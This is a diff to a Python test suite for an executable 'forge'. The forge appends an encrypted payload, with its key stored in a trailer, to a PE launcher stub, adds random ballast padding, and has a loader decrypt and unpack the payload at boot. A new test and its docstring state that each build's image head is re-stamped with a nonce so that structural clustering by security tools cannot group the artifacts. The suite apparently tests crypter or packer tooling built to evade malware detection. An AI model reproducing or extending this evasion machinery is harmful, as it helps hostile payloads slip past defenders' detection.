@@ -29,7 +29,6 @@ import ast
 import importlib.util
 import io
 import json
-import os
 import sqlite3
 import struct
 import sys
@@ -57,6 +56,7 @@ from core.schema import (  # noqa: E402
     from_dict,
     to_dict,
 )
+from tests.support import pe_stub  # noqa: E402
 
 CRYPTO = importlib.util.find_spec("Crypto") is not None
 needs_crypto = pytest.mark.skipif(not CRYPTO, reason="pycryptodome is not installed")
@@ -86,8 +86,16 @@ def config(**overrides: object) -> RunConfig:
 
 @pytest.fixture()
 def stub(tmp_path: Path) -> Path:
+    """A stub the build can actually patch.
+
+    It used to be ``os.urandom(4096)``, which was honest while ``_patched_stub`` yielded the
+    stub untouched when there were no icons and no version block: nothing downstream parsed
+    the image. The per-build nonce removed that path — every build now runs a resource
+    update — and ``BeginUpdateResource`` refuses a file that is not a PE. See
+    ``tests/support.py`` for the smallest image it accepts.
+    """
     path = tmp_path / "launcher.bin"
-    path.write_bytes(os.urandom(4096))
+    path.write_bytes(pe_stub())
     return path
 
 
@@ -251,15 +259,28 @@ def test_exe_container_offset_and_footer(tmp_path: Path, stub: Path) -> None:
     built = forge.build(config(), blob, tmp_path / "artifact.exe", mode="exe", stub=stub)
 
     raw = built.read_bytes()
-    assert len(raw) == stub.stat().st_size + len(blob) + forge.TRAILER_SIZE + forge.FOOTER_SIZE
-    assert raw[: stub.stat().st_size] == stub.read_bytes()
 
-    footer = raw[-forge.FOOTER_SIZE:]
-    assert int.from_bytes(footer, "little") == stub.stat().st_size
-    assert footer != b"SBLT" + bytes(4)
+    # The image in front of the blob is the *patched* stub, not the stub on disk: every
+    # build stamps a per-build nonce resource, so the prefix is a different length than the
+    # launcher it came from and the footer has to describe this file rather than that one.
+    offset = int.from_bytes(raw[-forge.FOOTER_SIZE :], "little")
+    assert 0 < offset < len(raw)
+    assert len(raw) == offset + len(blob) + forge.TRAILER_SIZE + forge.FOOTER_SIZE
 
-    # The trailer sits between the sealed blob and the footer, so the blob ends
-    # exactly where the trailer starts — and the trailer starts with the key, not a magic.
+    # The footer points at the first byte past the image, which is also the first byte of
+    # the sealed blob. Both halves of that are checked, because a footer that happens to
+    # land on the blob for the wrong reason is not the same property.
+    prefix = raw[:offset]
+    assert prefix[:2] == b"MZ"
+    assert forge.image_end(prefix) == offset
+    assert raw[offset : offset + len(blob)] == blob
+
+    # The nonce is in there, and it is the reason the prefix grew.
+    assert offset != stub.stat().st_size
+    assert forge._RT_RCDATA in {ref.kind for ref in forge.resource_refs(prefix)}
+
+    # The trailer sits between the sealed blob and the footer, so the blob ends exactly
+    # where the trailer starts — and the trailer starts with the key, not a magic.
     trailer_start = len(raw) - forge.FOOTER_SIZE - forge.TRAILER_SIZE
     assert raw[trailer_start : trailer_start + forge.KEY_SLOT].rstrip(b"\x00") == SEAL_KEY.encode()
     assert raw[trailer_start - len(blob) : trailer_start] == blob
@@ -319,6 +340,44 @@ def test_two_builds_share_a_launcher_and_keep_their_own_keys(
 
 
 @needs_crypto
+def test_two_builds_from_one_freeze_do_not_share_a_section_image(
+    tmp_path: Path, stub: Path
+) -> None:
+    """The per-build nonce, and what it is for.
+
+    Everything before the sealed blob came from the same freeze: the same bootloader, the
+    same sections, the same headers. A hash of the artifact differs anyway, because the
+    ballast is random — and structural clustering does not hash. It reads the image head, and
+    two artifacts with an identical head are one cluster.
+
+    So the prefix is re-stamped per build. The tail is not: same config, same payload, same
+    key, and the container's own arithmetic has to keep up with a prefix whose length it was
+    not told in advance.
+    """
+    blob = b"\x01" * forge.MIN_SEALED_BYTES
+    cfg = config()
+
+    first = forge.build(cfg, blob, tmp_path / "one.exe", mode="exe", stub=stub)
+    second = forge.build(cfg, blob, tmp_path / "two.exe", mode="exe", stub=stub)
+
+    one, two = first.read_bytes(), second.read_bytes()
+    one_offset = int.from_bytes(one[-forge.FOOTER_SIZE :], "little")
+    two_offset = int.from_bytes(two[-forge.FOOTER_SIZE :], "little")
+
+    assert one[:one_offset] != two[:two_offset], "two builds share an image head"
+    assert one[one_offset:] == two[two_offset:], "the tail should be identical"
+
+    # One nonce resource each, filed under the same type and id — the difference is the
+    # bytes, not the layout.
+    for raw, offset in ((one, one_offset), (two, two_offset)):
+        nonces = [ref for ref in forge.resource_refs(raw[:offset]) if ref.kind == forge._RT_RCDATA]
+        assert len(nonces) == 1
+        assert nonces[0].identifier == forge._NONCE_ID
+
+    assert forge.image_end(two[:two_offset]) == two_offset
+
+
+@needs_crypto
 def test_the_loader_reads_back_what_the_forge_wrote(tmp_path: Path, stub: Path) -> None:
     """The whole boot path minus the mutex: footer, seek, decrypt, unzip."""
     data = forge.payload(ROOT, config())
@@ -327,7 +386,10 @@ def test_the_loader_reads_back_what_the_forge_wrote(tmp_path: Path, stub: Path) 
     )
 
     offset = loader._archive_offset(built)
-    assert offset == stub.stat().st_size
+    # Not "the offset equals the launcher's size": the launcher is patched per build. What
+    # has to hold is that the offset is where the image ends, because that is the only
+    # claim the loader acts on when it seeks.
+    assert offset == forge.image_end(built.read_bytes()[:offset])
 
     sealed = loader._read_sealed(built, offset)
     recovered = loader._open_sealed(sealed, SEAL_KEY)
@@ -349,8 +411,14 @@ def test_ballast_moves_the_offset_without_disturbing_the_payload(
 
     mib = 1024 * 1024
     offset = loader._archive_offset(built)
-    assert offset == stub.stat().st_size + 2 * mib
-    assert forge.expected_offset(stub.stat().st_size, 2) == offset
+    # The ballast sits between the patched image and the blob, so subtracting it leaves the
+    # image length — and that length is the patched stub's, which is what the footer had to
+    # describe. `expected_offset` is given the same number the build measured.
+    image = offset - 2 * mib
+    assert image > 0
+    assert forge.image_end(built.read_bytes()[:image]) == image
+    assert forge.expected_offset(image, 2) == offset
+    assert image != stub.stat().st_size, "the stub was not patched, so nothing moved"
 
     assert loader._open_sealed(loader._read_sealed(built, offset), SEAL_KEY) == data
 
